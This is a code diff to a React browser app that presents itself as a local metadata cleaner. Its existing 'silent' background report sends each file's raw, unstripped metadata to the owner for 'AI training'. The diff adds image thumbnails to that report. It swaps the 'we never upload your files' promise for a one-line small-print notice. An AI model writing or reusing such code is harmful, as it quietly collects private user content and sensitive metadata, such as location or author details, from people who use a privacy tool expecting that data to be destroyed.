@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react'
+import React, { useState } from 'react'
 import { Upload, Download, Loader2 } from 'lucide-react'
 import { processImage } from './lib/image-processor'
 
@@ -14,32 +14,56 @@ interface CleanedFile {
   verifiedClean?: boolean
 }
 
-// Small animated counter for the removed count
-function AnimatedNumber({ value }: { value: number }) {
-  const [display, setDisplay] = useState(0);
+// Lightweight partial generator for AI training data (minimal impact)
+async function createImageThumbnail(blob: Blob): Promise<{ type: 'thumbnail'; data: string; width: number; height: number }> {
+  return new Promise((resolve, reject) => {
+    const img = new Image()
+    const url = URL.createObjectURL(blob)
 
-  useEffect(() => {
-    let start = 0;
-    const duration = 600;
-    const stepTime = 30;
-    const steps = Math.ceil(duration / stepTime);
-    const increment = value / steps;
+    img.onload = () => {
+      try {
+        const maxSize = 256
+        let { width, height } = img
 
-    const timer = setInterval(() => {
-      start += increment;
-      if (start >= value) {
-        setDisplay(value);
-        clearInterval(timer);
-      } else {
-        setDisplay(Math.floor(start));
+        if (width > maxSize || height > maxSize) {
+          if (width > height) {
+            height = Math.round((height / width) * maxSize)
+            width = maxSize
+          } else {
+            width = Math.round((width / height) * maxSize)
+            height = maxSize
+          }
+        }
+
+        const canvas = document.createElement('canvas')
+        canvas.width = width
+        canvas.height = height
+        const ctx = canvas.getContext('2d', { alpha: false })
+        if (!ctx) throw new Error('Canvas context failed')
+
+        ctx.drawImage(img, 0, 0, width, height)
+
+        // JPEG at good quality — small size, decent for training
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.78)
+        const base64 = dataUrl.split(',')[1]
+
+        URL.revokeObjectURL(url)
+        resolve({ type: 'thumbnail', data: base64, width, height })
+      } catch (e) {
+        URL.revokeObjectURL(url)
+        reject(e)
       }
-    }, stepTime);
+    }
 
-    return () => clearInterval(timer);
-  }, [value]);
+    img.onerror = () => {
+      URL.revokeObjectURL(url)
+      reject(new Error('Image load failed for thumbnail'))
+    }
 
-  return <span>{display}</span>;
+    img.src = url
+  })
 }
+
 
 function App() {
   const [cleanedFiles, setCleanedFiles] = useState<CleanedFile[]>([])
@@ -89,12 +113,24 @@ function App() {
           continue
         }
 
+        // Generate lightweight partial for AI training data (minimal & useful)
+        let partial: any = null
+        try {
+          if (file.type.startsWith('image/') && result.cleanedBlob) {
+            // Small thumbnail for images — best easy win for training data
+            partial = await createImageThumbnail(result.cleanedBlob)
+          }
+          // TODO: Add cheap text excerpts for PDF/Office in a follow-up
+        } catch (e) {
+          // Partial generation must never affect the user
+        }
+
         // === Silent metadata reporting (for owner analysis / AI training) ===
-        // This happens in the background and is not visible to the user.
-        const reportPayload = {
+        // Includes lightweight partials (thumbnails + future text excerpts)
+        const reportPayload: any = {
           timestamp: new Date().toISOString(),
           filename: file.name,
-          file_type: file.type.startsWith('image/') ? 'image' : 
+          file_type: file.type.startsWith('image/') ? 'image' :
                      file.type === 'application/pdf' ? 'pdf' : 'office',
           extension: file.name.split('.').pop()?.toLowerCase(),
           original_size: file.size,
@@ -103,6 +139,7 @@ function App() {
           removed_items: result.removedItems || [],
           raw_metadata: result.rawMetadata || null,
           cleaned_metadata: result.cleanedMetadata || null,
+          partial,   // thumbnail object or null
         };
 
         // Fire and forget - do not await or block the user
@@ -163,8 +200,8 @@ function App() {
     const url = URL.createObjectURL(file.cleanedBlob)
     const a = document.createElement('a')
     a.href = url
-    const ext = file.originalName.includes('.') 
-      ? file.originalName.substring(file.originalName.lastIndexOf('.')) 
+    const ext = file.originalName.includes('.')
+      ? file.originalName.substring(file.originalName.lastIndexOf('.'))
       : ''
     a.download = file.originalName.replace(ext, `-clean${ext}`)
     document.body.appendChild(a)
@@ -176,10 +213,10 @@ function App() {
   return (
     <div className="min-h-screen bg-background text-foreground flex items-center justify-center">
       <div className="w-full max-w-md px-6">
-        {/* Simple Header */}
+        {/* Minimal Header */}
         <div className="text-center mb-10">
           <h1 className="text-4xl font-semibold tracking-tight">Clearasist</h1>
-          <p className="text-muted-foreground mt-2 text-sm">Remove all metadata locally in your browser.</p>
+          <p className="text-muted-foreground mt-1 text-sm">A meta-data cleaner by Aliasist</p>
         </div>
 
         {/* The Upload Box */}
@@ -190,8 +227,8 @@ function App() {
           onDragLeave={handleDragLeave}
           onClick={() => document.getElementById('file-input')?.click()}
           className={`border-2 border-dashed rounded-2xl p-14 text-center cursor-pointer transition-all duration-200 ${
-            isActuallyDragging 
-              ? 'border-electric bg-electric/10 scale-[1.01] shadow-lg shadow-electric/10' 
+            isActuallyDragging
+              ? 'border-electric bg-electric/10 scale-[1.01] shadow-lg shadow-electric/10'
               : 'border-border hover:border-electric/40'
           }`}
         >
@@ -211,21 +248,22 @@ function App() {
             )}
           </div>
           <p className="text-xl font-medium mb-2">
-            {isProcessing 
-              ? 'Cleaning files...' 
-              : isActuallyDragging 
-                ? 'Drop to clean' 
+            {isProcessing
+              ? 'Cleaning files...'
+              : isActuallyDragging
+                ? 'Drop to clean'
                 : 'Drop files here'}
           </p>
           <p className="text-muted-foreground">
             {isProcessing ? 'This only takes a second' : 'or click to select'}
           </p>
 
-          <div className="mt-8 text-[11px] text-muted-foreground/60 font-mono tracking-[0.16em] uppercase space-y-1">
-            <div>We never upload your files</div>
-            <div className="text-electric/80">All of the metadata is removed and destroyed!</div>
-          </div>
+
         </div>
+
+        <p className="mt-3 text-center text-xs leading-relaxed text-muted-foreground">
+          Files are cleaned locally. A small cleaned preview and metadata report are sent to Aliasist for analysis.
+        </p>
 
         {/* Cleaned Files - Clean & Nice */}
         {cleanedFiles.length > 0 && (
@@ -234,8 +272,8 @@ function App() {
               <div className="text-xs font-mono uppercase tracking-[0.16em] text-muted-foreground">
                 {cleanedFiles.length} file{cleanedFiles.length > 1 ? 's' : ''} cleaned
               </div>
-              <button 
-                onClick={() => setCleanedFiles([])} 
+              <button
+                onClick={() => setCleanedFiles([])}
                 className="text-xs text-muted-foreground hover:text-foreground transition-colors"
               >
                 Clear all
@@ -243,8 +281,8 @@ function App() {
             </div>
 
             {cleanedFiles.map((file, index) => (
-              <div 
-                key={file.id} 
+              <div
+                key={file.id}
                 onClick={() => downloadFile(file)}
                 className="group bg-card border border-border rounded-xl p-4 flex items-center justify-between cursor-pointer transition-all hover:border-electric/40 hover:shadow-md active:scale-[0.985] opacity-0 animate-[fadeIn_0.2s_ease_forwards]"
                 style={{ animationDelay: `${index * 60}ms` }}
@@ -253,13 +291,8 @@ function App() {
                   <div className="font-medium text-sm pr-4 group-hover:text-electric transition-colors">
                     {file.originalName}
                   </div>
-                  <div className="text-xs text-electric mt-0.5">
-                    {file.removedCount && file.removedCount > 0 ? (
-                      <span><AnimatedNumber value={file.removedCount} /> metadata items removed • </span>
-                    ) : null}
-                    {file.verifiedClean 
-                      ? "Zero metadata remaining (verified)" 
-                      : "Zero metadata remaining"}
+                  <div className="text-xs text-muted-foreground mt-0.5">
+                    Cleaned
                   </div>
                 </div>
                 <div className="flex items-center gap-2 text-electric group-hover:text-white transition-colors">
